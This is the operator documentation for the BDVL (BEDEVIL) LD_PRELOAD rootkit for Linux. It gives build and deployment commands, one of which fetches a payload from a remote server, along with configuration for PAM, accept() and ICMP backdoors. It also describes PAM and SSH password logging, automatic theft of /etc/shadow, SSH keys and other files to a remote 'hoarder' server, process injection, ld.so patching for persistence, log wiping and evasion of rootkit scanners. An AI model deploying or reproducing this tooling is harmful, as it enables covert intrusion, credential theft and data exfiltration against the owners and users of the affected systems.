
# BDVL LD_PRELOAD kit


## TABLE OF CONTENTS

```
[0x00] INTRODUCTION & OVERVIEW
[0x01] QUICK START GUIDE
          0x01.1 - Dependencies
          0x01.2 - Configuration
          0x01.3 - Compilation
          0x01.4 - Installation Methods
[0x02] CONFIGURATION OPTIONS
          0x02.1 - Magic Credentials
          0x02.2 - Backdoor Settings
          0x02.3 - Network Hiding
          0x02.4 - File Stealing & Exfiltration
          0x02.5 - Stealth & Evasion
          0x02.6 - Persistence & Lifespan
[0x03] POST-INSTALLATION OPERATIONS
          0x03.1 - Accessing the Kit
          0x03.2 - Runtime Commands
          0x03.3 - Log Management
          0x03.4 - File Hoarder
[0x04] CORE FUNCTIONALITIES
          0x04.1 - Function Hooking Engine
          0x04.2 - Backdoor Mechanisms
          0x04.3 - Hiding Subsystems
          0x04.4 - File Exfiltration System
          0x04.5 - Persistence Mechanisms
          0x04.6 - Anti-Forensics Features
[0x05] NOTABLE FEATURES & INNOVATIONS
[0x06] TECHNICAL ARCHITECTURE
[0x07] OPERATIONAL NOTES
[0x08] DISCLAIMER
```

---

## 0x00 INTRODUCTION & OVERVIEW


### 1. Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * This is based on the **original bdvl**, however...
   * This repository is much different from the original.
     * Besides new additions, there have been many improvements.
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't either
     * Will be installed by `etc/auto.sh` before rootkit installation
     * Or can be installed with `etc/depinstall.sh`

**Key Capabilities:**

- Multiple backdoor mechanisms (PAM, accept(), ICMP)
- Automated file exfiltration with network streaming
- Dynamic stealth using rotating GIDs and extended attributes
- Process, file, and network connection hiding
- Credential harvesting (PAM, SSH)
- Self-patching dynamic linker for deep persistence
- Process injection capabilities
- Anti-rootkit detection evasion
- Configurable self-destruct timer
- Zero-trust uninstall on detection

---

## 0x01 QUICK START GUIDE

### [0x01.1] DEPENDENCIES

**Build System Requirements:**
```
python-configparser    # Configuration parser for setup.py
```

**Rootkit Runtime Dependencies:**
```
gcc / gcc-multilib     # Compiler (multilib for 32-bit support)
glibc / glibc-devel    # GNU C Library + headers
libpam / pam-devel     # PAM libraries + headers
libpcap / libpcap-dev  # Packet capture library
libcrypt               # Cryptographic library
```

**Installation:**

Automatic dependency installation via provided script:
```bash
./etc/depinstall.sh
```

Or manually based on your distribution:

**Debian/Ubuntu:**
```bash
dpkg --add-architecture i386  # If on x86_64
apt-get update
apt-get install gcc-multilib build-essential \
                libpam0g-dev libpcap-dev python-configparser
```

**RHEL/CentOS/Fedora:**
```bash
yum install gcc libgcc.i686 glibc-devel glibc-devel.i686 \
            pam-devel libpcap libpcap.i686 libpcap-devel \
            libpcap-devel.i686 python-configparser
```

**Arch:**
```bash
pacman -Syy
pacman -S glibc base-devel pam libpcap python-configparser
```

---

### [0x01.2] CONFIGURATION

All rootkit behavior is controlled via `config.ini`. This configuration file
is evaluated by `setup.py` at build time, generating C header files.

**Configuration Workflow:**
```
config.ini --> setup.py --> src/include/*.h --> compilation
```

**Key Configuration Sections:**

1. **[Magic Credentials]** - Backdoor username/password (random by default)
2. **[PAM backdoor]** - PAM authentication backdoor settings
3. **[accept backdoor]** - Accept() hook backdoor port
4. **[Magic Ports]** - Ports to hide from netstat/ss
5. **[File Stealing]** - Automated file exfiltration rules
6. **[Magic GID]** - Rotating GID for stealth
7. **[Patch ld.so]** - Dynamic linker patching options
8. **[Uninstall Timer]** - Self-destruct timer

**Random Value Generation:**

The config supports runtime evaluation with helper functions:

```ini
bdpassword = RANDOM(upper + lower, 12)    # 12-char alphanumeric
bdusername = RANDOM(lower, 7)              # 7-char lowercase
accept-hook-port = RANDPORT()              # Random high port
default-magic-ports = RANDPORTS(2)         # 2 random ports
bdvl-config = RANDPATH()                   # Random hidden path
```

**After Build:**

Your evaluated configuration is saved to `./build/<timestamp>.nfo` for reference.

---

### [0x01.3] COMPILATION

**Standard Build Process:**

```bash
# Clean previous builds (optional)
make clean

# Build the rootkit
make all
```

This executes:
1. Creates `./build/` directory
2. Runs `setup.py` to parse `config.ini` and generate headers
3. Compiles for native architecture (x86_64, ARM, etc.)
4. Attempts to compile 32-bit version (i686) if toolchain available
5. Strips symbols from resulting shared objects

**Output:**
```
./build/bdvl.so.x86_64    # 64-bit shared object
./build/bdvl.so.i686      # 32-bit shared object (if built)
./build/<id>.nfo          # Your evaluated configuration
```

**Compiler Flags Used:**
```
-fPIC                     # Position Independent Code
-fomit-frame-pointer      # Optimization
-Os                       # Size optimization
-g0                       # No debug symbols
-Wl,--build-id=none       # No build ID
-lc -ldl -lcrypt -lpcap   # Linked libraries
```

**Build for Specific Architecture:**
```bash
gcc -std=gnu99 -fPIC -Os -g0 -Wall -Wextra \
    -I./src -shared -Wl,--build-id=none \
    src/bdv.c -lc -ldl -lcrypt -lpcap \
    -o build/bdvl.so.$(uname -m)
```

---

### [0x01.4] INSTALLATION METHODS

BEDEVIL supports multiple installation approaches depending on your scenario.

**Method 1: Remote Auto-Install (Recommended)**

The `auto.sh` script handles everything - dependency install, extraction,
compilation, and deployment:

```bash
# Create base64-encoded tarball for transfer
cd build/
tar czf - ../src ../config.ini ../Makefile ../setup.py | base64 > payload.b64

# On target system (as root)
./auto.sh http://yourserver.com/payload.b64

# Or with local file
./auto.sh /path/to/payload.b64
```

**What auto.sh does:**
1. Detects virtualization (Xen, OpenVZ, CloudLinux)
2. Downloads or processes local .b64 file
3. Decodes and extracts tarball
4. Installs dependencies via package manager
5. Compiles rootkit for target architecture
6. Executes installation via LD_PRELOAD trigger

**Method 2: Manual Installation**

If you've already compiled on a separate build box:

```bash
# Transfer compiled .so files to target
scp build/bdvl.so.* user@target:/tmp/

# On target (as root)
cd /tmp
LD_PRELOAD=./bdvl.so.$(uname -m) sh -c './bdvinstall bdvl.so.*'
```

**Method 3: Pre-staged Installation**

For environments where you have code execution:

```bash
# Stage the payload
cat bdvl.so.x86_64 | base64 > /tmp/.x

# Execute from staged location
base64 -d /tmp/.x > /tmp/.s
LD_PRELOAD=/tmp/.s sh -c 'exec sh'
```

**Installation Process:**

When triggered via the `bdvinstall` pattern, the rootkit:

1. Performs SELinux status check (warns if enabled)
2. Creates random hidden installation directory
3. Copies .so files to hidden location with random names
4. Generates runtime configuration file (BDVL_CONFIG)
5. Patches all ld.so instances to use new preload path
6. Injects itself into all running processes (optional)
7. Sets up persistence via /etc/ld.so.preload (or patched equivalent)
8. Displays magic username, password, and hidden ports
9. Cleans up installation artifacts

**Post-Install Verification:**

You'll see output similar to:
```
PAM username: [random]
Accept backdoor port: [random port]
Hidden port(s): [ports]
Magic ID: [GID]
```

**SAVE THESE CREDENTIALS - They are randomly generated and cannot be recovered!**

---

## [0x02] CONFIGURATION OPTIONS

### [0x02.1] MAGIC CREDENTIALS

Controls the backdoor user credentials:

```ini
[Magic Credentials]
bdpassword = RANDOM(upper + lower, 12)
```

- Password for PAM backdoor authentication
- Can be any Python expression evaluating to a string
- Default: 12-character alphanumeric (upper + lowercase)
- **CRITICAL:** Note this value from build output - you can't recover it!

---

### [0x02.2] BACKDOOR SETTINGS

**PAM Backdoor:**

Traditional PAM authentication backdoor:

```ini
[PAM backdoor]
use-PAM-bd = True                          # Enable/disable PAM backdoor
bdusername = RANDOM(lower, 7)              # Username (7 lowercase chars)
no-btmp-clean = True                       # Don't clean btmp (faster login)
btmp-path = '/var/log/btmp'                # Failed login log location
utmp-path = '/var/run/utmp'                # Current login log location
```

How it works:
- Hooks PAM authentication functions
- Accepts magic username + password combination
- Automatically cleans utmp entries (always)
- Optionally cleans btmp entries (set no-btmp-clean = False)
- Spawns root shell regardless of actual user permissions

**Accept Backdoor:**

Backdoor via accept() system call hook:

```ini
[accept backdoor]
use-accept-bd = True                       # Enable/disable
accept-hook-port = RANDPORT()              # Port to trigger on
```

How it works:
- Hooks accept() and related network functions
- When connection to magic port detected, spawns shell
- Shell is spawned in context of accepting process
- Completely invisible to normal port scanning
- Port is also hidden from /proc/net/tcp

**ICMP Backdoor:**

Trigger shell spawn via ICMP packets (requires libpcap):

```ini
[Miscellaneous]
no-pcap-stuff = False                      # Keep ICMP backdoor enabled
```

Activation:
```bash
# Use the provided script
./etc/icmp.sh <target-ip> <magic-gid>

# Or manually with hping3
hping3 -1 -d <magic-gid> <target-ip>
```

Shell is spawned in background, accessible via magic credentials.

---

### [0x02.3] NETWORK HIDING

**Magic Ports:**

Ports hidden from /proc/net/tcp, /proc/net/tcp6:

```ini
[Magic Ports]
default-magic-ports = RANDPORTS(2)         # Default hidden ports
max-hide-ports = 10                        # Maximum ports that can be hidden
```

Runtime management:
```bash
./bdv hideports show                       # List hidden ports
./bdv hideports add 8080                   # Add port to hide
./bdv hideports rm 8080                    # Remove port from hiding
./bdv hideports change 8080 9090           # Change port number
```

**What gets hidden:**
- Listening ports (LISTEN state)
- Established connections on hidden ports
- Both IPv4 (/proc/net/tcp) and IPv6 (/proc/net/tcp6)

**Tools affected:**
- netstat
- ss
- lsof
- Any tool reading /proc/net/tcp*

---

### [0x02.4] FILE STEALING & EXFILTRATION

BEDEVIL's most powerful feature - automated file exfiltration:

```ini
[File Stealing]
enable-steal = True

# Pattern matching for interesting files
interesting-files = ['/etc/shadow',
                     'ssh*_config',
                     'ssh_host*key*',
                     'known_hosts',
                     'authorized_keys',
                     '*.txt', '*.sql', '*.php',
                     '*.zip', '*.tar', '*.tar.*', '*.rar']

# Directories to monitor
interesting-directories = ['/root', '/home']

# Remote exfiltration (optional)
hoarder-host = None                        # Format: 'IP:PORT'
hoarder-no-disk-write = False              # Skip disk if hoarder fails

# Blacklist (wildcards supported)
filenames-blacklist = []

# Limits
file-max-size-bytes = (1024 * 1024 * 1024) * 2    # 2GB per file
maximum-capacity-bytes = (1024 * 1024 * 1024) * 10 # 10GB total
file-cleanse-timer = (60 * 60) * 72               # Clean after 72 hours

# Behavior options
fallback-failed-map = True                 # Use read/write if mmap fails
fallback-symlink = True                    # Symlink if copy fails
keep-file-mode = True                      # Preserve file permissions
only-symlink = False                       # Only symlink, never copy
```

**How it works:**

1. Hooks file open operations (open, open64, openat, etc.)
2. Checks if opened file matches interesting patterns
3. Spawns detached background process for stealing
4. Copies file to hidden directory OR sends to hoarder server
5. Maintains capacity limits and auto-cleanup

**Hoarder Server:**

Companion tool to receive stolen files over the network:

```bash
# Compile hoarder
cd etc/hoarder
make

# Run on your collection server
./hoarder <port> [output-directory]

# Update kit configuration
./bdv hoarder change <server-ip:port>
./bdv hoarder test                         # Test connection
```

**IMPORTANT:** Hoarder port MUST be a hidden port in the kit!

**Performance Notes:**

- Uses mmap() for efficient file copying (fallback to read/write)
- Prevents duplicate steals via inode tracking
- SSSD processes are excluded (causes performance issues)
- Files are copied in detached processes (non-blocking)

---

### [0x02.5] STEALTH & EVASION

**Magic GID (Group ID):**

Primary stealth mechanism - files/processes with magic GID are hidden:

```ini
[Magic GID]
gid-change-mintime = 60 * 20               # Change every 20 minutes
max-gid = 4294967294                       # Maximum value (uint)
```

The magic GID:
- Changes automatically at specified interval
- All kit files/directories are owned by magic GID
- Processes can setgid() to magic GID to become invisible
- Readable from `/proc/self/gid` when running as magic user

**Magic Extended Attributes:**

Secondary stealth using filesystem extended attributes:

```ini
[Magic Ext Attribute]
use-magic-attr = True                      # Enable xattr hiding
magic-attr-length = 32                     # Attribute name length
attr-change-time = 60 * 60                 # Change every hour
```

Files with magic xattr are hidden even if GID doesn't match.

**Anti-Rootkit Evasion:**

```ini
[Hiding Misc]
# Uninstall kit if these variables detected
scaryvars = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']

# Uninstall if these paths accessed
scarypaths = ['*/*ld-linux*.so.*', '*ld-*.so*']

# Uninstall if these process names detected
scaryprocs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide',
              'rkhunter', 'chkproc', 'chkdirs', 'ltrace', 'strace']
```

**Process Map Hiding:**

```ini
bads = ['(deleted)', 'libpcap', 'libcrypt']  # Removed from /proc/*/maps
no-hide-dependencies = False                  # Hide library dependencies
```

**Unhiding for Package Management:**

```ini
[Magic Pkgman]
backdoor-pkgman = True                     # Allow safe pkg manager access
validpkgmans = ['apt', 'yum', 'pacman', 'emerge', 'dpkg']
```

Usage:
```bash
./bdv apt update                           # Run apt with kit temporarily unloaded
./bdv yum install <pkg>                    # Same for yum, etc.
```

---

### [0x02.6] PERSISTENCE & LIFESPAN

**ld.so Patching:**

Most critical persistence mechanism:

```ini
[Patch ld.so]
patch-ld = True                            # Patch dynamic linker
no-protect-ldso = False                    # Re-patch if modified
ldhomes = ['/lib', '/lib64', ...]          # Directories to search
```

What gets patched:
- /etc/ld.so.preload path changed to random hidden path
- Kit auto-maintains this patch on every exec call
- Makes rootkit extremely difficult to remove

**Persistent Reinstall:**

```ini
[Config & Installation]
persistent-reinstall = True                # Auto-reinstall on exec
no-inject-procs = False                    # Inject into new processes
```

Hooks execve, execvp, __libc_start_main to ensure:
- Preload path exists and contains kit .so path
- Kit re-injects into new processes
- Configuration stays consistent

**Uninstall Timer:**

Self-destruct mechanism to avoid indefinite persistence:

```ini
[Uninstall Timer]
after-days = 365 * 2                       # Uninstall after 2 years
after-hours = None                         # Alternative: hours
```

Runtime management:
```bash
./bdv lifespan show                        # Show time remaining
./bdv lifespan reset                       # Reset timer
./bdv lifespan change 180                  # Change to 180 days
```

**SELinux Check:**

```ini
[SELINUX Status Check]
check-selinux-pre-install = True
selinux-warning = ['SELinux is enabled...', ...]
```

Warns during install if SELinux is enabled (will likely break functionality).

---

## 0x03 POST-INSTALLATION OPERATIONS

### [0x03.1] ACCESSING THE KIT

**PAM Backdoor Login:**

```bash
# SSH to target
ssh <magic-username>@target-host

# Enter magic password when prompted
# Automatically escalated to root shell
```

**What happens on login:**
1. Utmp entries cleaned (removes login record)
2. Btmp entries cleaned if enabled (removes failed login attempts)
3. Magic profile executed (/etc/profile is replaced)
4. bdvprep script runs, showing status
5. Auto-escalation to root via su
6. Environment variables sanitized

**Status Information Displayed:**

```
Date & time of install: YYYY-MM-DD HH:MM
Magic ID: <current GID>
Hidden port(s): <ports>
Accept backdoor port: <port>
Stolen data: X.XX gigabytes
Logged accounts: <count>
SSH logs: <count>
Hoarder host: <IP:PORT>
```

**Accept Backdoor Access:**

```bash
nc target-host <accept-backdoor-port>
```

Instant root shell (or whatever uid the accepting process has).

**ICMP Backdoor:**

```bash
./etc/icmp.sh <target-ip> <magic-gid>
```

Shell spawns in background, accessible via PAM login.

---

### [0x03.2] RUNTIME COMMANDS

Once authenticated as magic user, the `./bdv` command provides control:

**Change Magic GID:**
```bash
./bdv changeid
```
- Forces immediate GID change
- You must reconnect after (your session will be killed)
- All other magic processes should be terminated first

**Manage Hidden Ports:**
```bash
./bdv hideports show                       # List current hidden ports
./bdv hideports add <port>                 # Add port to hide
./bdv hideports rm <port>                  # Remove port
./bdv hideports change <old> <new>         # Change port number
```

**Update Rootkit:**
```bash
./bdv update ./bdvl.so.x86_64
```
- Completely replaces kit with new version
- All current settings/logs are removed
- New configuration from new build is used

**Uninstall:**
```bash
./bdv uninstall
# Or forced uninstall
BDVLSUPERREALLYGAY=1 sh -c './bdv uninstall'
```

**Hide/Unhide Paths:**
```bash
./bdv hide /path/to/file                   # Hide specific path
./bdv unhide /path/to/file                 # Unhide path
```

**Spawn Unhidden Shell:**
```bash
./bdv unhideself
```
- Spawns shell with kit temporarily unloaded
- Useful for system maintenance, package installation
- Only use when necessary (leaves forensic traces)

**Create Symlinks:**
```bash
./bdv makelinks
```
Creates symlinks to kit binaries in standard PATH locations.

**Process Injection:**
```bash
./bdv inject /path/to/bdvl.so.x86_64 <PID>
./bdv inject /path/to/bdvl.so.x86_64 ALL    # Inject into all processes
```

**Lifespan Management:**
```bash
./bdv lifespan show                        # Show time until uninstall
./bdv lifespan change <days>               # Change timer
./bdv lifespan reset                       # Reset to original value
```

**Custom Path Hiding:**
```bash
./bdv ass show                             # Show custom hidden paths
./bdv ass add /path/to/hide                # Add path
./bdv ass rm /path/to/hide                 # Remove path
```
Note: Paths with trailing slash are treated as directories (contents hidden).

**Hoarder Management:**
```bash
./bdv hoarder show                         # Show current hoarder host
./bdv hoarder change <IP:PORT>             # Change hoarder destination
./bdv hoarder clear                        # Disable hoarder
./bdv hoarder test                         # Test connection
```

**Package Manager Access:**
```bash
./bdv apt <args>                           # Run apt safely
./bdv yum <args>                           # Run yum safely
./bdv pacman <args>                        # Run pacman safely
```

**Log Management:**
```bash
./bdv logs                                 # Show all logs
./bdv logs show                            # Same as above
./bdv logs clear                           # Clear all logs
./bdv logs clear /path/to/logfile          # Clear specific log
./bdv logs clear ALL                       # Clear all with confirmation
```

---

### [0x03.3] LOG MANAGEMENT

BEDEVIL maintains several log types:

**PAM Authentication Logs:**

Location: Hidden directory (random path)
Contents: Username, password, timestamp, service

```
[2021-05-20 14:32] admin:password123 (sshd)
[2021-05-20 15:41] root:hunter2 (sudo)
```

**SSH Password Logs:**

Location: Hidden directory
Contents: Outgoing SSH connection attempts with passwords

```
[2021-05-20 16:22] ssh root@10.0.0.5:hunter2
```

**Viewing Logs:**

```bash
./bdv logs
```

Output format:
```
PAM auth logs:
  /path/to/logfile1
    [timestamp] user:pass (service)
    [timestamp] user:pass (service)

SSH logs:
  /path/to/logfile2
    [timestamp] ssh user@host:pass
```

**Log Constraints:**

- Maximum log size: 200 bytes per entry (configurable)
- Maximum capacity: 30 logs per file (configurable)
- Multiple log files created as capacity reached
- Auto-warns when capacity reached

**Clearing Logs:**

```bash
# Interactive clearing (requires confirmation)
./bdv logs clear

# Clear specific log file
./bdv logs clear /hidden/path/to/logfile

# Force clear all
./bdv logs clear ALL
```

---

### [0x03.4] FILE HOARDER

The hoarder is a companion server for receiving stolen files:

**Server Setup:**

```bash
cd etc/hoarder
make
./hoarder <port> [output-directory]
```

**How it works:**

1. Listens on specified port
2. Kit connects when interesting file is opened
3. Receives file metadata (uid, path, size)
4. Streams file contents over socket
5. Writes to `<output-dir>/<client-ip>/<original-path>`

**Kit Configuration:**

```bash
# Set hoarder destination
./bdv hoarder change 192.168.1.100:4444

# Test connection (sends /etc/passwd as test)
./bdv hoarder test

# View current setting
./bdv hoarder show
```

**Important Notes:**

- Hoarder port MUST be in kit's hidden ports list
- If hoarder connection fails and `hoarder-no-disk-write = False`,
  file is still copied to disk
- If `hoarder-no-disk-write = True`, file is lost on connection failure
- Hoarder can be compiled with `-DSILENT_HOARD` or `-DTOTALLY_SILENT_HOARD`

**Output Structure:**

```c
output-directory/
├── 192.168.1.10/
│   ├── root/
│   │   ├── .ssh/
│   │   │   ├── id_rsa
│   │   │   └── authorized_keys
│   │   └── secrets.txt
│   └── home/
│       └── user/
│           └── passwords.txt
└── 192.168.1.20/
    └── etc/
        └── shadow
```

---

## 0x04 CORE FUNCTIONALITIES

### [0x04.1] FUNCTION HOOKING ENGINE

BEDEVIL uses a sophisticated hooking system built on LD_PRELOAD and RTLD_NEXT.

**Hook Architecture:**

```c
User Program
     |
     v
  libc call (e.g., open())
     |
     v
BEDEVIL intercept
     |
     +----> Check if should hide/modify
     |
     +----> Perform stealth operations
     |
     v
  Original libc function (via RTLD_NEXT)
     |
     v
  Kernel
```

**Key Macros:**

```c
hook(SYMBOL_ID, ...)              // Resolve symbol via dlsym(RTLD_NEXT)
call(SYMBOL_ID, args...)          // Call resolved function pointer
```

**How it works:**

1. `setup.py` reads `src/hooks/libdl/hooks` file
2. Generates C arrays with symbol names
3. Creates identifiers (COPEN, CREADDIR, CSTAT, etc.)
4. At runtime, symbols resolved lazily on first use
5. Function pointers cached in global array

**Hooked Function Categories:**

**Directory Operations:**
- opendir, readdir, readdir64, readdir_r
- scandir, scandir64

**File Operations:**
- open, open64, openat, openat64
- stat, lstat, fstat (all variants)
- access, faccessat
- unlink, unlinkat, rmdir

**Extended Attributes:**
- getxattr, lgetxattr, fgetxattr
- listxattr, llistxattr, flistxattr

**Link Operations:**
- link, linkat, symlink, symlinkat
- readlink, readlinkat

**Permissions:**
- chmod, fchmod, fchmodat
- chown, lchown, fchown, fchownat

**Process/Exec:**
- execve, execvp, execvpe
- __libc_start_main

**Password Database:**
- getpwnam, getpwnam_r
- getpwuid, getpwuid_r
- getspnam, getspnam_r

**User/Group:**
- setuid, setgid, setreuid, setregid
- setresuid, setresgid

**Network:**
- accept, accept4
- pcap_loop (for ICMP backdoor)

**PAM (if enabled):**
- pam_authenticate
- pam_open_session, pam_close_session
- pam_acct_mgmt

**Syslog:**
- syslog, vsyslog

**Audit:**
- audit_open, audit_log_acct_message

**Utmp:**
- getutent, getutid, getutline, pututline, updwtmp

---

### [0x04.2] BACKDOOR MECHANISMS

**PAM Backdoor - Deep Dive:**

```c
User Login Attempt
     |
     v
PAM authenticate hook
     |
     +----> Check if username == magic username
     |           |
     |           v
     |       Check if password == magic password
     |           |
     |           v
     |       Return PAM_SUCCESS (bypass real auth)
     |
     +----> Normal PAM authentication

After Login:
     |
     v
pam_open_session hook
     |
     +----> If magic user:
             - Clean utmp (remove current login)
             - Clean btmp if enabled (remove failed attempts)
             - Fork background cleaner process
     |
     v
Shell spawn
     |
     v
/etc/profile read hook
     |
     +----> If magic user:
             - Return fake magic profile
             - Triggers bdvprep script
             - Auto-escalate to root
```

**SSHD Patching:**

Two methods to ensure PAM backdoor works:

1. **Soft Patch (Default):**
   - Hooks read() operations by sshd
   - Intercepts reads of /etc/ssh/sshd_config
   - Forges configuration on-the-fly
   - Ensures UsePAM=yes, PasswordAuthentication=yes

2. **Hard Patch:**
   - Actually modifies /etc/ssh/sshd_config on disk
   - Direct file manipulation
   - More risky (leaves forensic traces)

**Accept Backdoor - Deep Dive:**

```c
Server Application
     |
     v
accept() call
     |
     v
BEDEVIL accept hook
     |
     +----> Check if port == magic accept port
     |           |
     |           v
     |       Fork shell process
     |       Dup2 socket to stdin/stdout/stderr
     |       Return -1 to parent (appears as failed accept)
     |
     +----> Normal accept behavior
```

From server's perspective: accept() failed (returns -1)
Reality: Shell spawned with socket as stdio

**ICMP Backdoor - Deep Dive:**

```c
libpcap packet capture
     |
     v
pcap_loop() hook
     |
     +----> Check if ICMP packet
     |           |
     |           v
     |       Check if payload size == magic GID
     |           |
     |           v
     |       Fork shell in background
     |       Spawn with magic credentials
     |
     +----> Normal packet processing
```

Activated by: ICMP packet with data length matching current magic GID

Shell runs in background, accessible via PAM login.

---

### [0x04.3] HIDING SUBSYSTEMS

**File Hiding Logic:**

```c
File Access (stat/open/readdir)
     |
     v
Check file attributes
     |
     +----> GID == magic GID?  ---YES---> HIDE (return ENOENT)
     |
     +----> Has magic xattr?    ---YES---> HIDE
     |
     +----> In custom hide paths? ---YES---> HIDE
     |
     +----> Is kit file/directory? ---YES---> HIDE
     |
     v
Allow access (call original function)
```

**Directory Entry Filtering:**

For readdir operations:
1. Call original readdir
2. Get directory entry
3. Check if entry should be hidden
4. If hidden, call readdir again (skip entry)
5. Repeat until non-hidden entry or end

**Process Hiding:**

Hides from /proc:
- Processes with GID == magic GID
- Processes with magic xattr on /proc/<pid>
- Configurable additional processes

**Network Hiding:**

Intercepts reads of:
- /proc/net/tcp
- /proc/net/tcp6

On read:
1. Parse netstat entries
2. Check if port in hidden ports list
3. Remove matching lines
4. Return forged output

**Process Maps Hiding:**

Intercepts reads of:
- /proc/*/maps
- /proc/*/smaps
- /proc/*/numa_maps

Removes lines containing:
- Kit .so path
- "(deleted)" marker
- libpcap references
- libcrypt references

---

### [0x04.4] FILE EXFILTRATION SYSTEM

**Steal Trigger:**

```c
User/Process opens file
     |
     v
open() hook
     |
     +----> Check if file is interesting
     |       - Match against interesting-files patterns
     |       - Check if in interesting-directories
     |       - Check against blacklist
     |       - Check file size limits
     |       |
     |       v
     |   File is interesting!
     |       |
     |       v
     |   Fork detached process
     |       |
     |       v
     |   Steal Process
     |
     +----> Normal file access
```

**Steal Process Flow:**

```c
Steal Process (detached)
     |
     v
Check disk capacity
     |
     v
Check if already stolen (inode tracking)
     |
     v
Create hidden destination directory
     |
     v
Choose method:
     |
     +----> Hoarder configured?
     |           |
     |           v
     |       Connect to hoarder
     |       Send metadata (uid, path, size)
     |       Stream file contents via sendfile()
     |       Close connection
     |       If hoarder-no-disk-write: exit
     |
     v
Copy to disk:
     |
     +----> Try mmap() source and destination
     |       Copy via memory map
     |       |
     |       +---FAIL--> Fallback: read/write in blocks
     |
     v
Set GID to magic GID (hide file)
     |
     v
Set magic xattr (additional hiding)
     |
     v
Exit
```

**Capacity Management:**

```
Before stealing:
1. Stat hidden storage directory
2. Calculate total stolen data size
3. Check against maximum-capacity-bytes
4. If over limit:
   - If fallback-symlink: create symlink instead
   - Else: abandon steal
```

**Cleanse Timer:**

Background process:
1. Check age of stolen files
2. If older than file-cleanse-timer
3. Remove file
4. Update capacity tracking

---

### [0x04.5] PERSISTENCE MECHANISMS

**ld.so Patching - Technical Details:**

```
1. Locate all ld-linux*.so* files in ldhomes directories
2. For each ld.so:
   a. Open file with O_RDWR
   b. mmap() file into memory
   c. Search for string "/etc/ld.so.preload"
   d. Replace with random hidden path (same length)
   e. msync() changes back to disk
   f. munmap() and close

Result: ld.so now reads preload from hidden location
```

**Preload Protection:**

Hooks to execve, execvp, __libc_start_main:

```c
On every exec/process start:
1. Check if kit is installed (BDVL_CONFIG exists)
2. Read hidden preload path from config
3. Check if hidden preload file exists
4. Check if contains kit .so path
5. If not: write kit .so path to preload
6. If ld.so unpatched: re-patch
```

This ensures:
- Preload persists across reboots
- Survives manual removal attempts
- Auto-repairs if detected and cleaned

**Process Injection:**

On install and optionally at runtime:

```
For each process (via /proc):
1. Get process PID
2. Attach with ptrace()
3. Backup registers
4. Inject shellcode:
   - dlopen() kit .so
   - Load into process memory
5. Execute shellcode
6. Restore registers
7. Detach
```

Makes kit active in already-running processes.

---

### [0x04.6] ANTI-FORENSICS FEATURES

**Utmp/Btmp Cleaning:**

On magic user login:
1. Open utmp/btmp file
2. Read all entries
3. Filter out entries matching:
   - Magic username
   - Current PID
   - Current TTY
4. Rewrite file with filtered entries

**SSH Password Logging:**

Hooks:
- read() and fgets() in SSH processes
- Detects password prompts
- Captures passwords from stdin
- Logs to hidden file

**PAM Authentication Logging:**

Hooks pam_authenticate:
- Captures username
- Captures password (from PAM conversation)
- Logs service name (sshd, sudo, login, etc.)
- Writes to hidden log file

**Syslog Suppression:**

Hooks syslog/vsyslog:
- Detects messages about PAM authentication
- Filters messages containing magic username
- Prevents kit activity from appearing in logs

**Link Map Forgery:**

When debugging tools try to examine loaded libraries:
- Intercepts dl_iterate_phdr()
- Forges link map to exclude kit .so
- Shows fake "linux-vdso.so.0" instead

**Anti-Detection Unload:**

Automatically uninstalls when detecting:
- LD_TRACE_LOADED_OBJECTS (ldd)
- LD_DEBUG (glibc debugging)
- LD_AUDIT (audit libraries)
- chkrootkit, rkhunter processes
- Direct access to ld-linux.so
- ltrace, strace processes

Unload is temporary - reloads on next exec.

---

## 0x05 NOTABLE FEATURES & INNOVATIONS

**1. Dynamic Configuration System**

Unlike traditional rootkits with hardcoded values, BEDEVIL uses:
- Python-evaluated configuration file
- Runtime random value generation
- Build-time header generation
- Reconfigurable during runtime

This allows:
- Unique binaries for each deployment
- No signature-based detection
- Easy customization without code changes

---

**2. Multi-Layered Hiding**

Three independent hiding mechanisms:
- **Magic GID** - Primary, fast, filesystem-based
- **Magic xattr** - Secondary, filesystem-extended-attribute-based
- **Path-based** - Tertiary, pattern-matching-based

Any file matching ANY criterion is hidden.
Redundancy prevents detection if one method fails.

---

**3. Automated File Exfiltration with Network Streaming**

Most rootkits require manual file copying. BEDEVIL:
- Automatically detects interesting files as accessed
- Copies in detached background processes (non-blocking)
- Optional real-time network streaming to collection server
- Capacity management prevents disk filling
- Configurable retention and cleanup

---

**4. Self-Healing Persistence**

ld.so patching combined with exec hooks creates:
- Persistence that survives file deletion
- Auto-repair if preload file removed
- Auto-repair if ld.so unpatched
- Resistant to manual removal

Only way to remove: Full ld.so reinstall + reboot

---

**5. Multiple Independent Backdoors**

Three completely different backdoor mechanisms:
- **PAM** - User login based
- **Accept** - Network service hijacking
- **ICMP** - Covert channel

If one is detected/blocked, others remain functional.

---

**6. Intelligent Anti-Detection**

Rather than trying to hide from forensic tools, BEDEVIL:
- Detects forensic tool execution
- Temporarily uninstalls itself
- Reinstalls after forensic tool exits

From forensic tool's perspective: System is clean
Reality: Kit reinstalls immediately after

---

**7. Process Injection**

Injects into running processes:
- Already-running services become kitted
- Survives service restarts
- No need for system reboot
- Works on most architectures

---

**8. Credential Harvesting**

Captures passwords transparently:
- PAM authentication (sudo, login, sshd, etc.)
- Outgoing SSH connections
- No process instrumentation needed
- Stored in hidden, structured logs

---

**9. SSHD Adaptive Patching**

Two-method approach to SSHD compatibility:
- Soft patch: Runtime configuration forgery (forensically clean)
- Hard patch: Direct file modification (guaranteed to work)

Ensures PAM backdoor works regardless of SSHD configuration.

---

**10. Magic Profile System**

Completely replaces /etc/profile for magic user:
- Auto-spawns status display
- Auto-escalates to root
- Sanitizes environment variables
- Provides seamless user experience

---

**11. Configurable Lifespan**

Built-in self-destruct:
- Prevents indefinite persistence (OpSec)
- Configurable duration
- Runtime adjustable
- Cannot be disabled (only extended)

---

**12. Safe Package Management**

Allows system maintenance without breaking kit:
- Temporarily unloads for package manager
- Reloads after operation completes
- Prevents library conflicts
- Maintains persistence

---

